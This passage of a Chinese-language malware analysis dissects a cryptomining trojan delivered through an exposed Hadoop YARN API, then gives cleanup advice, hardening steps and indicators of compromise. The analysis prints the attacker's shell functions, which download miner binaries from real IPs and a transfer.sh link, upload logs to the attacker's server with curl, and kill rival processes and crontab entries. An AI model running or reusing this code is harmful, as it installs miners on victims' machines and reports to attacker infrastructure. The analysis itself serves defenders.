    24.                    WGET="wget --no-check-certificate -O ";  
    25.                fi  
    26.                echo "" > $DIR/tmp.txt  
    27.                rm -rf $DIR/java  
    28.                download  
    29.  
    30.                if [ -x "$(command -v md5sum)" ]  
    31.                then  
    32.                    sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    33.                    echo $sum  
    34.                    case $sum in  
    35.                        183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    36.                            echo "Java OK"  
    37.                            cp $DIR/java $DIR/ppc  
    38.                        ;;  
    39.                        *)  
    40.                            $WGET $DIR/java https://transfer.sh/WoGXx/zzz > $DIR/tmp.txt 2>&1  
    41.                            echo "Java wrong"  
    42.                            sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    43.                            case $sum in  
    44.                                183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    45.                                    echo "Java OK"  
    46.                                    cp $DIR/java $DIR/ppc  
    47.                                ;;  
    48.                                *)  
    49.                                    echo "Java wrong2"  
    50.                                ;;  
    51.                            esac  
    52.                        ;;  
    53.                    esac  
    54.                else  
    55.                    echo "No md5sum"  
    56.                fi  
    57.  
    58.                sumAfter=$(md5sum $DIR/java | awk '{ print $1 }')  
    59.                if [ -s /usr/bin/curl ];  
    60.                then  
    61.                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/java` >> $DIR/tmp.txt  
    62.                    curl -F "file=@$DIR/tmp.txt" http://$f2/re.php  
    63.                fi  
    64.            ;;  
    65.        esac  
    66.    else  
    67.        echo "No md5sum"  
    68.        download  
    69.    fi  
    70.}  
这个方法的核心功能还是校验已存在的挖矿程序的MD5，如果无法验证或者文件不存在的情况，则直接调用download方法下载挖矿程序；如果文件存在但MD5匹配不正确，则调用download方法后再次验证，验证失败则尝试从另外一个下载渠道下载挖矿程序并再次验证。最后还将相关结果上报到目标服务器$f2的re.php.
tmp.txt内容示例：
    1.download() {  
    2.    if [ -x "$(command -v md5sum)" ]  
    3.    then  
    4.        sum=$(md5sum $DIR/ppc | awk '{ print $1 }')  
    5.        echo $sum  
    6.        case $sum in  
    7.            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    8.                echo "Java OK"  
    9.                cp $DIR/ppc $DIR/java  
    10.            ;;  
    11.            *)  
    12.                echo "Java wrong"  
    13.                download2  
    14.            ;;  
    15.        esac  
    16.    else  
    17.        echo "No md5sum"  
    18.        download2  
    19.    fi  
    20.}  
download方法判断ppc文件的存在与否和 MD5是否匹配，如果不存在或MD5不匹配则调用download2下载，如果存在则复制重名为java。
    1.download2() {  
    2.    f1=$(curl 185.222.210.59/g.php)  
    3.    if [ -z "$f1" ];  
    4.    then  
    5.        f1=$(wget -q -O - 185.222.210.59/g.php)  
    6.    fi  
    7.  
    8.    if [ `getconf LONG_BIT` = "64" ]  
    9.    then  
    10.        $WGET $DIR/java http://$f1/xm64?$RANDOM  
    11.    else  
    12.        $WGET $DIR/java http://$f1/xm32?$RANDOM  
    13.    fi  
    14.  
    15.    if [ -x "$(command -v md5sum)" ]  
    16.    then  
    17.        sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    18.        echo $sum  
    19.        case $sum in  
    20.            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    21.                echo "Java OK"  
    22.                cp $DIR/java $DIR/ppc  
    23.            ;;  
    24.            *)  
    25.                echo "Java wrong"  
    26.            ;;  
    27.        esac  
    28.    else  
    29.        echo "No md5sum"  
    30.    fi  
    31.}  
download2方法则判断系统下载对应版本的挖矿程序，其中返回的是另外一个IP地址；下载成功后则再次验证，并复制重命名为ppc。
    1.pkill -f logo4.jpg  
    2.pkill -f logo0.jpg  
    3.pkill -f logo9.jpg  
    4.pkill -f jvs  
    5.pkill -f javs  
    6.pkill -f 192.99.142.248  
    7.rm -rf /tmp/pscd*  
    8.rm -rf /var/tmp/pscd*  
    9.crontab -l | sed '/192.99.142.232/d' | crontab -  
    10.crontab -l | sed '/192.99.142.226/d' | crontab -  
    11.crontab -l | sed '/192.99.142.248/d' | crontab -  
    12.crontab -l | sed '/logo4/d' | crontab -  
    13.crontab -l | sed '/logo9/d' | crontab -  
    14.crontab -l | sed '/logo0/d' | crontab -  
在脚本的最后部分还有一些进程、文件、crontab清理的处理，用pkill删除满足条件的进程，删除tmp目录下pscd开头的文件，以及说删除crontab中存在某些关键词的任务。
至此，我们完成整个脚本的分析，虽然整个脚本比较冗长，而且似乎各个函数嵌套调用，涉及文件也众多，但其实整体就做了以下几件事：
  1. 清理相关的进程、文件和crontab任务
  2. 判断并下载挖矿程序，同时校验MD5值，除了黑客自己控制的服务器，还利用提供备用下载，多种方式保障
  3. 增加脚本下载执行任务添加到crontab里
其实，我们通过查看YARN的日志文件`yarn-root-nodemanager-master.hadoop.log`也可能看到相应的痕迹：
或者我们通过管理UI查看application详情：
而crontab的任务日志也能看到相关的执行记录：
最终在/var/tmp目录下也能找到相关的文件
#### 四、安全建议
###### 清理病毒
  1. 使用top查看进程，kill掉异常进程
  2. 检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件
  3. 检查crontab任务列表，删除异常任务
  4. 排查YARN日志，确认异常的application，删除处理
###### 安全加固
  1. 通过iptables或者安全组配置访问策略，限制对8088等端口的访问
  2. 如无必要，不要将接口开放在公网，改为本地或者内网调用
  3. 升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问
  4. 云镜当前已支持该漏洞检测，同时也支持挖矿木马的发现，建议安装云镜并开通专业版，及时发现漏洞并修复或者在中马后能及时收到提醒进行止损
  5. 更多自检和修复建议可以参考 
#### 五、IOCs
###### 钱包地址
4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg
###### MD5
  1. c8c1f2da51fbd0aea60e11a81236c9dc
  2. 183664ceb9c4d7179d5345249f1ee0c4
  3. b00f4bbd82d2f5ec7c8152625684f853
###### 矿池地址
  1. 158.69.133.20:3333
  2. 192.99.142.249:3333
  3. 202.144.193.110:3333
  4. 46.30.43.159:80
###### 部分相关URL
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
  7. 
  8. 
  9. 
  10. 
  11. 
  12. 
  13. 
* * *